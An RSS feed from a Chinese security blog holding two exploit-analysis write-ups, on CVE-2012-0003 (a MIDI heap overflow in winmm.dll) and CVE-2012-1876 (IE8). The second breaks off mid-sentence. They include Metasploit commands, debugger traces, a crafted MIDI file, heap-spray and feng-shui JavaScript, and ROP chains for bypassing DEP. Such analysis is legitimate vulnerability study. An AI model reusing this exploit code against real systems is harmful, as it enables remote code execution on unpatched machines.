<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Fri, 09 Dec 2016 16:29:26 +0800</pubDate>
    <lastBuildDate>Fri, 09 Dec 2016 16:29:26 +0800</lastBuildDate>
    <generator>Jekyll v3.3.1</generator>
    
      <item>
        <title>漏洞战争-cve-2012-0003</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 about&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;这个漏洞是由于微软的多媒体库winmm.dll(c:\windows\system32\winmm.dll)在处理MIDI文件时,由于对数据的处理不当导致的
堆溢出,攻击者可以在网页中嵌入特殊的MIDI文件来远程执行任意代码

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-准备工作&quot;&gt;0x01 准备工作&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;使用msf中的exp
    msfconsole
    search cve-2012-0003
    use exploit/windows/browser/ms12_004_midi
    set uripath test.html
    set payload windows/exec
    set cmd calc.exe
        server started
        http://192.168.118.129:8080/test.html
    奇怪的是在系统中不存在test.html,但是访问上面生成的网马链接确实会中马,后来查看msf中的exp:ms12_004_midi.rb,里
    面生成html的代码为
        send_response(cli, html, {'Content-Type'=&amp;gt;'text/html'})
    send_response函数在msfapi中有如下用法
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://rapid7.github.io/metasploit-framework/api/Msf/Exploit/Remote/HttpServer/HTML.html#send_response_html-instance_method&quot;&gt;msfapi_send_response&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    也即相当于msf内置webserver通过send_response函数发送html代码到客户端实现下面这个链接的访问
        http://192.168.118.129:8080/test.html
    这种方式比较特殊,可能msf的web是ruby的某个类似python下的Django的web框架开发的

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-调试分析&quot;&gt;0x02 调试分析&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;打开iexplore.exe
win+r:cmd
gflags -i iexplore.exe +hpa
    这里如果在windbg中设置!gflag +hpa不会成功,可能是winxp或是windbg的问题
windbg:f6附加iexplore.exe
!gflag
    0:016&amp;gt; !gflag
    Current NtGlobalFlag contents: 0x02000000
        hpa - Place heap allocations at ends of pages
g
ie打开http://192.168.118.129:8080/test.html
	(180.6f8): Access violation - code c0000005 (first chance)
	First chance exceptions are reported before any exception handling.
	This exception may be expected and handled.
	eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=16a7f019 edi=16a7cf60
	eip=76b2d224 esp=3685fe80 ebp=3685fea0 iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:16a7f019=??
    到这里只知道76b2d224处有内存访问异常,然而要想写出exp,还需要弄清参数传递过程,这个&quot;堆溢出&quot;cve的利用不是
    DWORD SHOOT,而是巧妙地构造html代码达到控制eip的目的,如果是利用堆溢出,一般会想到在上面访问异常时通过找到一个
    DWORD SHOOT的机会来覆盖异常处理相关的函数地址来控制eip,且要在可控数据复制到内存后找到堆分配调用

win+r:cmd
gflags -i iexplore.exe -hpa
bu WINMM!midiOutPlayNextPolyEvent
g
ie打开http://192.168.118.129:8080/test.html
    Breakpoint 0 hit
    eax=00000000 ebx=ffffffff ecx=7ffdf000 edx=00216790 esi=00216780 edi=002167d8
    eip=76b2d038 esp=0012e5b0 ebp=0012e5dc iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    WINMM!midiOutPlayNextPolyEvent:
    76b2d038 8bff            mov     edi,edi
    此时中断下来,再看看没有+hpa情况下的:WINMM!midiOutPlayNextPolyEvent+0x1ec会不会访问异常

bu WINMM!midiOutPlayNextPolyEvent+0x1ec
g
	Breakpoint 0 hit
	eax=00000251 ebx=0000007f ecx=007f2399 edx=00000000 esi=046de111 edi=025cd4f0
	eip=76b2d224 esp=0393fe80 ebp=0393fea0 iopl=0         nv up ei pl nz na po nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:046de111=00
	此时中断下来,看到这里的[esi]与上面异常访问时的[esi]不同,考虑到启用页堆是在堆块后增加专门用于检测溢出的栅栏
	页,以便在堆溢出触及栅栏页时立刻触发异常,而+hpa和-hpa的情况下[esi]不同,应该不是由于页堆造成的[esi]的不同,猜
	测是由于WINMM!midiOutPlayNextPolyEvent+0x1ec处要执行多遍,而刚开始执行到WINMM!midiOutPlayNextPolyEvent+0x1ec
	时[esi]处是可以访问的,只是msf中设置好的exp数据在后面某一次程序执行到WINMM!midiOutPlayNextPolyEvent+0x1ec时
	[esi]产生了变化,并在+hpa时,[esi]属于页堆增加的栅栏页的地址范围才导致+hpa时在某次执行到
	WINMM!midiOutPlayNextPolyEvent+0x1ec时造成访问异常,为了验证这个想法,进行如下操作:

关闭windbg
重新打开ie
cmd:
	gflags -i iexplore.exe +hpa
打开windbg,f6加载iexplore.exe

bu WINMM!midiOutPlayNextPolyEvent+0x1ec
bu WINMM!midiOutPlayNextPolyEvent
g
ie打开http://192.168.118.129:8080/test.html
	Breakpoint 1 hit
	eax=00000000 ebx=ffffffff ecx=7ff9d000 edx=16840f70 esi=16840f60 edi=16840fb8
	eip=76b2d038 esp=365bfbe0 ebp=365bfc0c iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
	WINMM!midiOutPlayNextPolyEvent:
	76b2d038 8bff            mov     edi,edi
g
	Breakpoint 1 hit
	eax=00000000 ebx=ffffffff ecx=7ff98000 edx=16840f70 esi=16840f60 edi=16840fb8
	eip=76b2d038 esp=3690fea4 ebp=3690fedc iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
	WINMM!midiOutPlayNextPolyEvent:
	76b2d038 8bff            mov     edi,edi
	这里看到WINMM!midiOutPlayNextPolyEvent第一次运行时不会经过+0x1ec的位置,在+1ec之前就返回了
g
	Breakpoint 0 hit
	eax=00000251 ebx=0000007f ecx=007f2399 edx=00000000 esi=16842e51 edi=16840f60
	eip=76b2d224 esp=3690fe80 ebp=3690fea0 iopl=0         nv up ei pl nz na po nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:16842e51=00
	这里看到第二次运行WINMM!midiOutPlayNextPolyEvent时第一次运行到+0x1ec处不会产生访问异常
g
	Breakpoint 0 hit
	eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=16843019 edi=16840f60
	eip=76b2d224 esp=3690fe80 ebp=3690fea0 iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:16843019=??
	这里看到第二次运行WINMM!midiOutPlayNextPolyEvent时第二次运行到+0x1ec处访问异常([esi]不识别),g即可验证
g
	(51c.674): Access violation - code c0000005 (first chance)
	First chance exceptions are reported before any exception handling.
	This exception may be expected and handled.
	eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=16843019 edi=16840f60
	eip=76b2d224 esp=3690fe80 ebp=3690fea0 iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:16843019=??
	这里可以看到的确是会触发异常的,也即+hpa时是第二次运行WINMM!midiOutPlayNextPolyEvent时第二次运行到+0x1ec处会
	访问异常,-hpa情况会怎样呢?进行如下操作验证:

关闭windbg,重新打开ie
gflags -i iexplore.exe -hpa
打开windbg,f6加载iexplore.exe
bu WINMM!midiOutPlayNextPolyEvent+0x1ec
bu WINMM!midiOutPlayNextPolyEvent
g
ie打开http://192.168.118.129:8080/test.html
	Breakpoint 1 hit
	eax=00000000 ebx=ffffffff ecx=7ffdf000 edx=0256aa28 esi=0256aa18 edi=0256aa70
	eip=76b2d038 esp=0012e5b0 ebp=0012e5dc iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
	WINMM!midiOutPlayNextPolyEvent:
	76b2d038 8bff            mov     edi,edi
g
	Breakpoint 1 hit
	eax=00000000 ebx=ffffffff ecx=7ff98000 edx=0256aa28 esi=0256aa18 edi=0256aa70
	eip=76b2d038 esp=0392fea4 ebp=0392fedc iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
	WINMM!midiOutPlayNextPolyEvent:
	76b2d038 8bff            mov     edi,edi
g
	Breakpoint 0 hit
	eax=00000251 ebx=0000007f ecx=007f2399 edx=00000000 esi=025cae59 edi=0256aa18
	eip=76b2d224 esp=0392fe80 ebp=0392fea0 iopl=0         nv up ei pl nz na po nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:025cae59=00
g
	Breakpoint 0 hit
	eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=025cb021 edi=0256aa18
	eip=76b2d224 esp=0392fe80 ebp=0392fea0 iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:025cb021=00
	可以看到-hpa情况下在第二次运行WINMM!midiOutPlayNextPolyEvent时第二次运行到+0x1ec处是不会产生访问异常的,结合
	+hpa的功能(定位导致漏洞的代码或函数)可知在第二次运行WINMM!midiOutPlayNextPolyEvent时第二次运行到+0x1ec处的
	这句指令将导致产生&quot;堆溢出&quot;

u .
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]
	76b2d226 8ad0            mov     dl,al
	76b2d228 740c            je      WINMM!midiOutPlayNextPolyEvent+0x1fe (76b2d236)
	76b2d22a 80e2f0          and     dl,0F0h
	76b2d22d 80faf0          cmp     dl,0F0h
	76b2d230 742d            je      WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
	76b2d232 0410            add     al,10h
	76b2d234 eb0a            jmp     WINMM!midiOutPlayNextPolyEvent+0x208 (76b2d240)
	看到的不多,扩大汇编指令范围

u eip-30 eip+30
	WINMM!midiOutPlayNextPolyEvent+0x1bc:
	76b2d1f4 e2f0            loop    WINMM!midiOutPlayNextPolyEvent+0x1ae (76b2d1e6)
	76b2d1f6 80fa90          cmp     dl,90h
	76b2d1f9 8855ff          mov     byte ptr [ebp-1],dl
	76b2d1fc 7405            je      WINMM!midiOutPlayNextPolyEvent+0x1cb (76b2d203)
	76b2d1fe 80fa80          cmp     dl,80h
	76b2d201 755c            jne     WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
	76b2d203 0fb6550b        movzx   edx,byte ptr [ebp+0Bh]
	76b2d207 83e00f          and     eax,0Fh
	76b2d20a c1e007          shl     eax,7
	76b2d20d 03c2            add     eax,edx
	76b2d20f 99              cdq
	76b2d210 2bc2            sub     eax,edx
	76b2d212 d1f8            sar     eax,1
	76b2d214 807dff80        cmp     byte ptr [ebp-1],80h
	76b2d218 742a            je      WINMM!midiOutPlayNextPolyEvent+0x20c (76b2d244)
	76b2d21a 84db            test    bl,bl
	76b2d21c 7426            je      WINMM!midiOutPlayNextPolyEvent+0x20c (76b2d244)
	[***]76b2d21e 03f0            add     esi,eax
	76b2d220 f6450b01        test    byte ptr [ebp+0Bh],1
	[==============&amp;gt;eip]76b2d224 8a06            mov     al,byte ptr [esi]
	76b2d226 8ad0            mov     dl,al
	76b2d228 740c            je      WINMM!midiOutPlayNextPolyEvent+0x1fe (76b2d236)
	76b2d22a 80e2f0          and     dl,0F0h
	76b2d22d 80faf0          cmp     dl,0F0h
	76b2d230 742d            je      WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
	76b2d232 0410            add     al,10h
	76b2d234 eb0a            jmp     WINMM!midiOutPlayNextPolyEvent+0x208 (76b2d240)
	76b2d236 80e20f          and     dl,0Fh
	76b2d239 80fa0f          cmp     dl,0Fh
	76b2d23c 7421            je      WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
	[***]76b2d23e fec0            inc     al
	[***]76b2d240 8806            mov     byte ptr [esi],al
	76b2d242 eb1b            jmp     WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
	76b2d244 f6450b01        test    byte ptr [ebp+0Bh],1
	76b2d248 8d1430          lea     edx,[eax+esi]
	76b2d24b 8a02            mov     al,byte ptr [edx]
	76b2d24d 7408            je      WINMM!midiOutPlayNextPolyEvent+0x21f (76b2d257)
	76b2d24f a8f0            test    al,0F0h
	76b2d251 740c            je      WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
	76b2d253 2c10            sub     al,10h
	在当前eip处eax=0x419,而eip最近执行过的与eax相关的指令为76b2d21e处的add esi,eax,书中分析的是此处的esi来源于
	winmmAlloc(0x400)分配到的内存地址,而add esi,eax中的eax=0x419超过了分配的0x400导致访问到超出0x19大小处的内容
	,在eip下面的76b2d23e和76b2d240处可以看到,[esi]的值会加1,也即在超出0x19大小处的内存中的内容会加1,这就是这个
	漏洞的危害:导致内存某处的值+1,只要能够控制这个0x19处的内存的内容,就有机会利用这个漏洞.

	上面之所以会有76b2d240处的导致[esi]加1的出现,是要在mid文件中的某个音轨事件处写上&quot;打开音符&quot;对应的值
	(书中是0x0073b29f),如下||之间的内容

	00000000: 4d54 6864 0000 0006 0000 0001 0060 4d54  MThd.........`MT
	00000010: 726b 0000 0035 00ff 030d 4472 756d 7320  rk...5....Drums 
	00000020: 2020 2842 4229 0000 c928 00b9 0764 00b9    (BB)...(...d..
	00000030: 0a40 00b9 7b00 00b9 5b28 00b9 5d00 8550  .@..{...[(..]..P
	00000040: 9923 7f00|9fb2 7300|ff2f 000a            .#....s../..

	满足mid文件中对应位置处的值为&quot;打开音符&quot;后,会导致在当前eip环境下的[esi]加1,也即76b2d21e执行后的[esi]加1,也即
	winAlloc(0x400)分配到的内存地址+0x19处的内容加1,而利用方式中正好是利用相应内存中的值加1导致任意代码执行.书
	中通过ida的f5分析函数调用与参数传递分析得到上面的esi的源是winmmAlloc(0x400),也即在打开mid文件后会有一个这样
	的内存分配动作,于是构造出如下结构的内存空间使得winmmAlloc(0x400)分到的内存地址相对可控:
	|xxxxxxxx|oooooooo|xxxxxxxxx|ooooooooo|xxxxxxxxx|ooooooooo|...
	也即在mid文件被ie解析之前,先用js构造上面这样的内存格式,其中xxx表示有数据,ooo表示空闲内存,每个||之间的内存大
	小正好为0x400,这样在上面内存结构的基础上再由ie解析mid文件而产生winmmAlloc(0x400)的动作就会分配到上面的ooo的
	某个位置上,然后由于mid文件是特殊的构造好的会使winmmAlloc(0x400)分到的内存地址+0x19处的内存的内容加1的文件,
	于是ie解析mid文件后,将导致winmmAlloc(0x400)分到的某个ooo位置的右边一个xxx的位置上的偏移0x19中的值加1,当上面
	构造的特殊内存格式时构造好该位置内容的值+1会使得代码执行时,就可以利用这个漏洞了,而书中(msf)的利用方式是用下
	面的js来达到目的的:

	[msf中的构造特殊内存结构的由ruby写的js]
    def build_element(element_name, my_target, type=&quot;corruption&quot;)
      dst = Rex::Text.to_unescape([my_target['DispatchDst']].pack(&quot;V&quot;))
      element = ''
  
      if my_target.name =~ /IE 8/
        max   = 63   # Number of attributes for IE 8
        index = 1    # Where we want to confuse the type
      else
        max   = 55   # Number of attributes for before IE 8
        index = 0    # Where we want to confuse the type
      end
  
      element &amp;lt;&amp;lt; &quot;var #{element_name} = document.createElement(\&quot;select\&quot;)&quot; + &quot;\n&quot;
  
      # Build attributes
      0.upto(max) do |i|
        case type
          when &quot;corruption&quot;
            obj = (i==index) ? &quot;unescape(\&quot;#{dst}\&quot;)&quot; : &quot;alert&quot;
          else #leak
            obj = &quot;alert&quot;
        end
        element &amp;lt;&amp;lt; &quot;#{element_name}.w#{i.to_s} = #{obj}&quot; + &quot;\n&quot;
      end
  
      return element
    end

    # Feng Shui and triggering Steps:
    # 1. Run the garbage collector before allocations
    # 2. Defragment the heap and alloc CImplAry objects in one step (objects size are IE version dependent)
    # 3. Make holes
    # 4. Let windows media play the crafted midi file and corrupt the heap
    # 5. Force the using of the confused tagVARIANT.
    def build_trigger(my_target, type=&quot;corruption&quot;)
      js_trigger = build_trigger_fn(my_target, type)
      select_element = build_element('selob', my_target, type)
  
      trigger = &amp;lt;&amp;lt;-JS
        var heap = new heapLib.ie();
        #{select_element}
        var clones = new Array(1000);
  
        function feng_shui() {
          heap.gc();
  
          var i = 0;
          while (i &amp;lt; 1000) {
            clones[i] = selob.cloneNode(true)
            i = i + 1;
          }
  
          var j = 0;
          while (j &amp;lt; 1000) {
            delete clones[j];
            CollectGarbage();
            j  = j + 2;
          }
        }
  
        feng_shui();
  
        #{js_trigger}
      JS
  
      trigger = heaplib(trigger, {:noobfu =&amp;gt; true})
      return trigger
    end

	上面msf中的代码对应书中的如下代码:
	var selob=document.createElement(&quot;select&quot;)
	selob.w0=alert
	selob.w1=unescape(&quot;%u0c0c %u0c0c&quot;)
	selob.w2=alert
	selob.w3=alert
	selob.w4=alert
	selob.w5=alert
	...
	...
	selob.w63=alert

	var clones=new Array(1000)
	
	function feng_shui(){

	var i=0
	while (i&amp;lt;1000){
	clones[i]=selob.cloneNode(true)
	i=i+1
	}

	var j=0
	while(j&amp;lt;1000){
	delete clones[j]
	CollectGarbage()
	j=j+2
	}
	}

	上面为了达到某处内容值+1得到控制代码执行的目的使用的是:
	创建select元素selob,设置64个属性,其中w1为string类型,其余为object类型,然后创建一个数组用来存放1000个selob元
	素,然后间隔释放1000个selob元素中的500个元素,然后由于ie解析mid文件,运行了winmmAlloc(0x400),得到的分配地址位
	于某个释放的selob元素的位置,由于mid文件中某处已经构造好了音轨事件是&quot;打开音符&quot;,于是会使得某个selob元素的+19
	位置的值+1,于是该selob元素的第二个属性w1由string变成object,然后由下面的js来触发这个变成object的属性相应函数
	的执行,触发js如下:

	function trigger(){
	var k=999
	while (k&amp;gt;0){
	if (typeof(clones[k].w1)==&quot;string&quot;){
	}else{
	clone[k].w1('come on!')
	}
	
	k=k-2
	}
	feng_shui()
	document.audio.Play()
	}

	上面的js中的函数trigger由下面的js调用执行(执行trigger函数在ie解析mid文件之后[也即在上面的
	document.audio.Play执行之后]):

	&amp;lt;/script&amp;gt;
	&amp;lt;script for=audio event=PlayStateChange(oldState,newState)&amp;gt;
		if (oldState == 3 &amp;amp;&amp;amp; newState == 0) {
			trigger();
		}
	&amp;lt;/script&amp;gt;

	在js构造的string变成object的属性时执行的函数的地址为0x0c0c0c0c是堆喷射的利用地址,对应msf中的构造堆喷射内存
	布局的代码如下:

    def build_spray(my_target, leak=0)
  
      # Extract string based on target
      if my_target.name == 'IE 8 on Windows XP SP3'
        js_extract_str = &quot;var block = shellcode.substring(2, (0x40000-0x21)/2);&quot;
      else
        js_extract_str = &quot;var block = shellcode.substring(0, (0x80000-6)/2);&quot;
      end
  
      # Build shellcode based on Rop requirement
      code = ''
      if my_target['Rop'] and datastore['MSHTML'].to_s != ''
        print_status(&quot;Generating ROP using info-leak: 0x#{leak.to_s(16)}&quot;)
        code &amp;lt;&amp;lt; create_info_leak_rop(my_target, leak)
        code &amp;lt;&amp;lt; payload.encoded
      elsif my_target['Rop'] and datastore['MSHTML'].to_s == ''
        print_status(&quot;Generating ROP using msvcrt&quot;)
        code &amp;lt;&amp;lt; create_rop(my_target, payload.encoded)
      else
        code &amp;lt;&amp;lt; payload.encoded
      end
  
      shellcode = Rex::Text.to_unescape(code)
  
      # 1. Create  big block of nops
      # 2. Compose one block which is nops + shellcode
      # 3. Repeat the block
      # 4. Extract string from the big block
      # 5. Spray
      spray = &amp;lt;&amp;lt;-JS
      var heap_obj = new heapLib.ie(0x10000);
  
      var code = unescape(&quot;#{shellcode}&quot;);
      var nops = unescape(&quot;%u0c0c%u0c0c&quot;);
  
      while (nops.length &amp;lt; 0x1000) nops+= nops;
      var shellcode =  nops.substring(0,0x800 - code.length) + code;
      while (shellcode.length &amp;lt; 0x40000) shellcode += shellcode;
  
      #{js_extract_str}
  
      heap_obj.gc();
      for (var i=0; i &amp;lt; 600; i++) {
        heap_obj.alloc(block);
      }
  
      JS
  
      spray = heaplib(spray, {:noobfu =&amp;gt; true})
      return spray
    end
  	  		
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x03-小结&quot;&gt;0x03 小结&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;漏洞场景:
程序(iexplore.exe)解析特殊构造的文件(mid)时,在内存中可找到有内存分配动作(winmmAlloc),分配的内存大小一定
(0x400),如果解析特殊文件(mid中音轨事件为打开音符)会使程序在分配到的内存地址范围之外(0x419&amp;gt;0x400)有改变
大小动作(使0x419偏移处的值+1)

利用方法:
可以通过与这里相同的js的构造特殊内存结构的方法来利用这个改变动作来控制eip.

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;首发于安全客,版权归安全客所有,http://bobao.360.cn/learning/detail/3278.html&lt;/p&gt;
</description>
        <pubDate>Fri, 09 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2010-0003/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2010-0003/</guid>
        
        <category>漏洞战争</category>
        
        <category>漏洞分析</category>
        
        <category>堆溢出</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>漏洞战争-cve-2012-1876</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;目标:Internet Explorer 8
目的:利用js绕过dep+aslr
漏洞源:MSHTML.dll
漏洞情况:
	Microsoft Internet Explorer 6到9和10 Consumer Preview没有正确处理内存中的对象,这允许远程攻击者通过尝试访问
	不存在的对象来执行任意代码,导致基于堆的缓冲区溢出,也称为&quot;Col元素远程代码执行漏洞&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;分析&quot;&gt;分析&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;书中在绕过dep的+aslr的时候有两次溢出,第一次是为了得到mshtml.dll的基址以便构造rop gadgets绕过dep,但是在msf的exp中
没有这个步骤,msf直接使用msvcrt.dll或jre.dll来绕过dep,尝试在实际环境中用mona获取msvcrt.dll的rop gadgets,发现获得
的rop gadgets结果与msf中的并不一致,如下:
msf的exp中的rop:

	  when :msvcrt
        print_status(&quot;Using msvcrt ROP&quot;)
        exec_size = code.length
        rop =
          [
            0x77c4ec01, # retn
            0x77c4ec00, # pop ebp; retn
            0x77c15ed5, # xchg eax,esp; retn (pivot)
            0x77c4e392, # pop eax; retn
            0x77c11120, # &amp;lt;- *&amp;amp;VirtualProtect()
            0x77c2e493, # mov eax, dword ptr ds:[eax]; pop ebp; retn
            junk,
            0x77c2dd6c,
            0x77c4ec00, # pop ebp; retn
            0x77c35459, # ptr to 'push esp; ret'
            0x77c47705, # pop ebx; retn
            exec_size,  # ebx
            0x77c3ea01, # pop ecx; retn
            0x77c5d000, # W pointer (lpOldProtect) (-&amp;gt; ecx)
            0x77c46100, # pop edi; retn
            0x77c46101, # rop nop (-&amp;gt; edi)
            0x77c4d680, # pop edx; retn
            0x00000040, # newProtect (0x40) (-&amp;gt; edx)
            0x77c4e392, # pop eax; retn
            nop,        # nops (-&amp;gt; eax)
            0x77c12df9  # pushad; retn
          ].pack(&quot;V*&quot;)
      when :jre
        print_status(&quot;Using JRE ROP&quot;)
        exec_size = code.length
        rop =
          [
            0x7c346c0b, # retn
            0x7c36f970, # pop ebp; retn
            0x7c348b05, # xchg eax,esp; retn (pivot)
            0x7c36f970, # pop ebp; retn [MSVCR71.dll]
            0x7c36f970, # skip 4 bytes [MSVCR71.dll]
            0x7c34373a, # pop ebx ; retn [MSVCR71.dll]
            exec_size,  # ebx
            0x7c3444d0, # pop edx ; retn [MSVCR71.dll]
            0x00000040, # 0x00000040-&amp;gt; edx
            0x7c361829, # pop ecx ; retn [MSVCR71.dll]
            0x7c38f036, # &amp;amp;Writable location [MSVCR71.dll]
            0x7c342766, # pop edi ; retn [MSVCR71.dll]
            0x7c346c0b, # retn (rop nop) [MSVCR71.dll]
            0x7c350564, # pop esi ; retn [MSVCR71.dll]
            0x7c3415a2, # jmp [eax] [MSVCR71.dll]
            0x7c3766ff, # pop eax ; retn [MSVCR71.dll]
            0x7c37a151, # ptr to &amp;amp;VirtualProtect() - 0x0ef [IAT msvcr71.dll]
            0x7c378c81, # pushad # add al,0ef ; retn [MSVCR71.dll]
            0x7c345c30  # ptr to 'push esp; ret ' [MSVCR71.dll]
          ].pack(&quot;V*&quot;)

虚拟机中(win7x64+immunity debugger32+python32+mona)用如下命令获取的rop gadgets:
command:!mona rop -m msvcrt.dll -cp nonull
rop gadgets:

		 def create_rop_chain()

		   # rop chain generated with mona.py - www.corelan.be
		   rop_gadgets =
		   [
			 0x7788ea09,  # POP EBP # RETN [msvcrt.dll]
			 0x7788ea09,  # skip 4 bytes [msvcrt.dll]
			 0x778afd36,  # POP EAX # RETN [msvcrt.dll]
			 0x3974ffff,  # put delta into eax (-&amp;gt; put 0x00000001 into ebx)
			 0x77847a6b,  # ADD EAX,C68B0002 # POP EDI # POP ESI # POP EBX # POP EBP # RETN [msvcrt.dll]
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x7788d3a5,  # XCHG EAX,EBX # RETN [msvcrt.dll]
			 0x7785f5d4,  # POP EAX # RETN [msvcrt.dll]
			 0x39750ffe,  # put delta into eax (-&amp;gt; put 0x00001000 into edx)
			 0x77847a6b,  # ADD EAX,C68B0002 # POP EDI # POP ESI # POP EBX # POP EBP # RETN [msvcrt.dll]
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x7786ad98,  # XCHG EAX,EDX # RETN [msvcrt.dll]
			 0x7785aeba,  # POP EAX # RETN [msvcrt.dll]
			 0xa2a7fcd6,  # put delta into eax (-&amp;gt; put 0x00000040 into ecx)
			 0x778b950f,  # ADD EAX,5D58036A # RETN [msvcrt.dll]
			 0x7784b984,  # XCHG EAX,ECX # ADD AL,5D # RETN 0x04 [msvcrt.dll]
			 0x77850a31,  # POP EDI # RETN [msvcrt.dll]
			 0x41414141,  # Filler (RETN offset compensation)
			 0x77829f09,  # RETN (ROP NOP) [msvcrt.dll]
			 0x7787c433,  # POP ESI # RETN [msvcrt.dll]
			 0x7782b7bd,  # JMP [EAX] [msvcrt.dll]
			 0x77851a3a,  # POP EAX # RETN [msvcrt.dll]
			 0x778211bc,  # ptr to &amp;amp;VirtualAlloc() [IAT msvcrt.dll]
			 0x77885cfc,  # PUSHAD # RETN [msvcrt.dll]
			 0x778530ad,  # ptr to 'call esp' [msvcrt.dll]
		   ].flatten.pack(&quot;V*&quot;)

		   return rop_gadgets

		 end
发现rop gadgets的地址并不一样,在msf中测试msf的exp是否有效,结果win7x64中的iex32并没有成功溢出,而是停止工作了,这
里查看系统是否开了dep,发现是开了的,难道msf中的exp不支持绕过dep?为了验证,将win7x64中dep关闭(要重启),重新测试msf
的exp,发现还是无法成功溢出,ie和之前一样出现异常而停止工作,后来看到书中配套资料中的rb文件是和msf中的rb文件不一样
的,msf中的rb文件应该是依靠没有启用aslr模块(msvcrt或jre)来一次溢出利用的,不过msf中的rb在本机测试并没有用,后来重
新测试书中配套资料中的rb文件,该rb文件是二次溢出来利用漏洞,第一次溢出找到模块基址,第二次溢出控制代码执行流程,但
是在本机测试依然失败,尝试换成x32系统,仍然失败,后来觉得可能是系统已经安装了补丁,但是systeminfo | find
